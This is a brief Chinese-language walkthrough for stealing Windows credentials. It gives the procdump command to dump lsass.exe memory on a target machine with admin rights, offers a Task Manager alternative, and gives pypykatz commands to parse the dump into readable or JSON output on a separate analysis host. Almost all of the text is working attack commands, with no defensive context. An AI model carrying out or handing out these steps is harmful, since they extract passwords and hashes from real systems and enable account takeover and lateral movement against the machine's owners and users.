> 在目标 Windows 上（需管理员权限）

下载并放置 `procdump.exe`，然后运行：

```
procdump -ma lsass.exe C:\Windows\Temp\lsass.dmp`
```

说明：

- `-ma` 表示生成完整内存转储（推荐以确保最高解析成功率）。
    
- 目标路径可按需改。
    

若无法运行 procdump，可通过 Windows Task Manager -> Right-click on lsass.exe -> Create dump file（需要会话/权限）。

---

# 用 pypykatz 解析 dump（CLI）

把 `lsass.dmp` 拷贝到分析主机后，运行：

`# 最常见用法：解析 LSA minidump 
```
pypykatz lsa minidump lsass.dmp`
```

想要机器可机读/结构化的输出（JSON）：
```
pypykatz lsa minidump lsass.dmp --json > pypykatz_output.json`

```

其它常见选项（示例）：

- `--format json` 或 `--json`：输出 JSON。
    
- `--log-file ファイル名`：将日志/输出写到文件（视版本而定）。
    

> 注意：不同版本 CLI 参数可能有小差异，但 `pypykatz lsa minidump <file>` 是最常见的基本用法。